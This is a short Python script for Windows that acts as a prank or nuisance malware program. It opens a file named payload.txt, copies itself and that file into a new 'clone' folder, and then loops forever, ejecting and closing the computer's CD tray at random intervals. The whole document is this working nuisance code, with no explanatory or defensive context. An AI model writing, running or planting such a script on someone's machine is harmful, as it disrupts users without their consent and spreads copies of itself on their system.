from sys import argv
import os
import ctypes
import time
import random


script = argv
name = str(script[0])

cmd = 'start payload.txt'
os.system(cmd)
os.mkdir('clone')
os.system(r'copy payload.txt clone')
os.system(r'copy ' + name + ' clone')

while True:
	blyat = random.randint(20,60)
	ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
	time.sleep(2)
	ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
	time.sleep(blyat)